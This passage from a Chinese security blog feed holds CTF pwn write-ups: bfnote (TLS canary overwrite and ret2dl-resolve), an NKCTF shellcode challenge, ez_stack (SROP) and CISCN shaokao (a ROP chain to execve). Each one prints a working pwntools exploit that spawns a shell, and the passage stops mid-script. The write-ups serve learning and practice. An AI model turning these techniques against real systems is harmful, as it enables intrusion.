class="class">&#123;</span>  </span><br><span class="line">  <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the  </span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span>  </span><br><span class="line">  <span class="type">dtv_t</span> *dtv;  </span><br><span class="line">  <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span>  </span><br><span class="line">  <span class="type">int</span> multiple_threads;  </span><br><span class="line">  <span class="type">int</span> gscope_flag;  </span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;  </span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;  </span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  </span><br><span class="line">  ...  </span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;  </span><br></pre></td></tr></table></figure><p>注意：结构中uintptr_t stack_guard就是canary值，利用漏洞篡改stack_guard值即可绕过canary，而gs或fs寄存器指向此结构.</p><p>【bfnote】</p><p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png" alt="image-20230628102341433"></p><p>（2）进IDA<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png" alt="image-20230628105142174"></p><p>漏洞：【1】s溢出0x600<br>           【2】v4进行初始化，检测限制了输入长度，而利用时并非利用了检测完成的值，利用了检测前的值，使得我们拥有一次在任意地址写入长度的能力<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png" alt="image-20230628110303853"></p><p>gs寄存器指向的位置实际上就是内存中某处的tcbhead_t，而后面的0x14指的是stack_guard相对的偏移，那么tcbhead_t到底存储在哪，每个libc不同，但是对于pwn题经常使用的lib来说，其分布基本如图所示<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png" alt="image-20230628111024934"></p><p>在libc地址更下位置和mmap一样同属共享映射区域，偏移相对固定.当我们malloc一个相当大的空间（此题&gt;&#x3D;0x20000），mallod就会用mmap来分配内存空间，其分配位置也会位于共享映射区域，依据mmap机制，其恰好处于tcbhead_r地址的低地址处，此时利用第二个漏洞写入可修改canary的值，从而实现绕过.<a href="https://blog.csdn.net/wmq880204/article/details/115163244?ops_request_misc=%7B%22request_id%22:%22168792272416800213048166%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168792272416800213048166&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-115163244-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=mmap=%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6&spm=1018.2226.3001.4187">(12条消息) Linux系统mmap内存映射机制原理_seqiqi_菠萝-琪琪的博客-CSDN博客</a></p><p>（3）ret2dl-resolve机制利用（延迟绑定应用）<br>利用的两种结构<em>Sym（x86为Elf32_Sym x64为Elf64_Sym）</em>、<em>Rel（x86为Elf32_Rel x64为Elf64_Rel）</em></p><p>Sym基本结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移（4字节）</span></span><br><span class="line">  Elf32_Addr    st_value;　　<span class="comment">//(4字节)</span></span><br><span class="line">  Elf32_Word    st_size;　　<span class="comment">//(4字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12(1字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;　　<span class="comment">//(1字节)</span></span><br><span class="line">  Elf32_Section st_shndx;　　<span class="comment">// (2字节)</span></span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf64_Sym</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;   <span class="comment">//符号名，是相对.dynstr起始的偏移(4字节）</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;   <span class="comment">//对于导入函数符号而言，它是0x12(1字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;  <span class="comment">//(1字节)</span></span><br><span class="line">  Elf64_Section st_shndx;  <span class="comment">//(2字节）</span></span><br><span class="line">  Elf64_Addr    st_value;  <span class="comment">//(8字节)</span></span><br><span class="line">  Elf64_Xword   st_size;   <span class="comment">//(8字节)</span></span><br><span class="line">&#125;;<span class="comment">//对于导入函数而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><p>Rel基本结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;<span class="comment">//是got的对应的地址(4字节)</span></span><br><span class="line">    Elf32_Word       r_info; <span class="comment">//(4字节),其中最低字节应该为0x7，前三个字节当做一个数字，是相对.dynsym起始的偏移的下标(即偏移还需要除以0x10)</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Xword    r_offset;   <span class="comment">//是got的对应的地址(8字节)</span></span><br><span class="line">    Elf64_Xword    r_info;     <span class="comment">//(8字节),其中最低字节应该为0x7,前三个字节当做一个</span></span><br><span class="line">　　</span><br><span class="line"> Elf64_Sxword r_addend; 　　<span class="comment">//(8字节)</span></span><br><span class="line"> </span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure><p><u>一般x64选择gadget进行攻击 此题也为32位 故以下详细介绍32位使用ret2dl-resolve攻击方法</u><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png" alt="image-20230628115713705"></p><p>32位延迟绑定具体流程<br>*第一个push的值实际上是对应的Rel和.dynrel的相对偏移<br> *jmp跳转到第一个第一个push偏移对应的Rel结构，取出里面的info中包含的sym结构的下标，找到对应的sym中的字符串的地址，从而解析到这个名称为该字符串的函数，将其地址写入rel第一项的地址中。此时，将栈清空到一开始push的两个值之前，从而正常执行对应的字符串的函数即可。</p><p>我们的ret2dl-resolve实际上设置为.got.plt<a href="%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9B%BE%E4%B8%AD%E7%9A%840x8048450">0</a>对应的地址即可，从而他解析完成后会继续按照给定的参数执行。<br><em>tip</em><br>中间的空白，作为gap，是因为执行的时候最后有栈地址的变化，若无gap作为阻隔，可能栈的变化会覆盖掉一些重要的数据，从而导致程序崩溃，所以需要留有一定的gap作为栈空间变化的gap</p><p>（4）漏洞利用<br>观察主函数发现一共进行了三次输入：<br>【1】修改canary、最终的返回地址及栈地址（可看汇编）<br>【2】伪造了一个shellcode<br>【3】使用TSL，绕过canary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png" alt="image-20230628134309027"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25009</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./bfnote&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bfnote&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">bss_start = <span class="number">0x0804A060</span></span><br><span class="line">gap = <span class="number">0x500</span></span><br><span class="line">stack_overflow = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x3e</span> - <span class="number">0xc</span> + <span class="number">0x8</span>) + p64(bss_start + gap + <span class="number">0x4</span>)</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your description : &#x27;</span>)</span><br><span class="line">r.send(stack_overflow)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your postscript : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_sym = p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> - <span class="number">0x80482C8</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">fake_rel = p32(bss_start) + p32(<span class="number">0x7</span> + <span class="built_in">int</span>((bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> + <span class="number">0x8</span> + <span class="number">0x8</span> - <span class="number">0x080481D8</span>) / <span class="number">0x10</span>) * <span class="number">0x100</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span> * gap + p32(<span class="number">0x08048450</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> * <span class="number">2</span> - <span class="number">0x080483D0</span>) + p32(<span class="number">0</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;system\x00\x00&#x27;</span> + fake_rel + fake_sym)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your notebook size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0x20000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0xf7d22714</span> - <span class="number">0xf7d01008</span> - <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;invalid ! please re-enter :\n&#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your note : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>难难难 啃啃啃<br>明天又是新的一天⭐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部分PWN题目记录</title>
      <link href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwn题目记录"><a href="#Pwn题目记录" class="headerlink" title="Pwn题目记录"></a><strong>Pwn题目记录</strong></h3><h3 id="【NKCTF】"><a href="#【NKCTF】" class="headerlink" title="【NKCTF】"></a>【NKCTF】</h3><p>弱小可怜无助的唯一。<br>（1）checkesec 发现为64位 只有NX保护<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530231132244.png" alt="image-20230530231132244"></p><p>（2）进IDA分析 </p><p>  F5查看main函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234240598.png"></p><p>  查看偏移为0x74（buf[108]+8[ebp大小]） buf2大小随机  无后门函数 此时联想到使用pwntools生成可利用的shellcode   v6随机执行但未设置随机数种子【注释打漏了😜】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234339502.png" alt="image-20230530234339502"><br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;, 1337)</span></span><br><span class="line">buf = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">108</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">payload = buf + <span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">104</span>-<span class="built_in">len</span>(shellcode)) +shellcode</span><br><span class="line">log.success(<span class="string">&quot;shellcode_len : &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>选择用\x90（nop）进行填充使得攻击代码更具稳定性<br>104减去shellcode长度的b’\x90’字节，这个部分作用是将shellcode挪到最后（shellcode可能在中间生成），如果没有nopsled的填充，后面的数据会覆盖前面的shellcode，从而导致攻击失败。也就是说，这部分的填充是为了让Shellcode不会被后面的数据覆盖。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531002410442.png" alt="image-20230531002410442"></p><p>统统通</p><h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a><strong>ez_stack</strong></h3><p>(1)checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150721336.png" alt="image-20230531150721336"></p><p>发现NX打开 准备进IDA找溢出</p><p>（2）进IDA<br>  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150942976.png" alt="image-20230531150942976"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531151017632.png" alt="image-20230531151017632"></p><p>​       发现溢出部分 无”&#x2F;bin&#x2F;sh” 需要我们构造rop链自行写入<br>​       常规思路就是第一次rop往<a href="https://so.csdn.net/so/search?q=bss&spm=1001.2101.3001.7020">bss</a>上写&#x2F;bin&#x2F;sh，然后第二次调用execve<br>​       但程序本身没有本地直接调用函数-&gt;通过syscall来得到shell<br>​       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531170223533.png" alt="image-20230531170223533"></p><p> 查看发现为SROP  在.data段找到可写入&#x2F;bin&#x2F;sh的地址</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531160459228.png" alt="image-20230531160459228"> </p><p>执行完 read 的系统调用，此时 rax &#x3D;&#x3D; 0  利用SROP 【只用于可写方法内】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531171529997.png" alt="image-20230531171529997"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node2.yuzhian.com.cn&#x27;,35543)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x4011ee</span></span><br><span class="line">mov_rax_15 = <span class="number">0x401146</span></span><br><span class="line">bin_sh = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x4011C8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rax_15)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="built_in">str</span>(sigframe)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;F!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SROP小赠品（<a href="https://www.cnblogs.com/bpcat/p/16879300.html">https://www.cnblogs.com/bpcat/p/16879300.html</a>)</p><h3 id="【2023CISCN】"><a href="#【2023CISCN】" class="headerlink" title="【2023CISCN】"></a>【2023CISCN】</h3><h4 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a><strong>shaokao</strong></h4><p>（1）虚拟机checksec一下</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/0.png" alt="0"></p><p>（2）运行一下程序玩玩</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.png" alt="1"></p><p>发现没碰到特别之处<br>（3）转战IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/2.png" alt="2"></p><p>查看mian函数发现隐藏目录5 跟踪看看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/3.png" alt="3"></p><p>发现strcpy 猜测v1进行了溢出</p><p>再往下翻翻<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/4.png" alt="4"></p><p>syscall  以及sys_exit 明显的系统调用号</p><p>到data段查找可写入口<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/5.png" alt="5"></p><p>搜索sys 发现-result 猜测负数（-10000）打开目录5<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527200932728.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/8.png" alt="8">（4）利用ROPgadget 构造所需execve系统调用exp<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/61.png" alt="61"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/6.png" alt="6"></p><p>（5）构造对应exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;39.106.71.184&#x27;,23931)</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;？\n&quot;</span>,<span class="string">b&quot;-10000&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret _1</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span 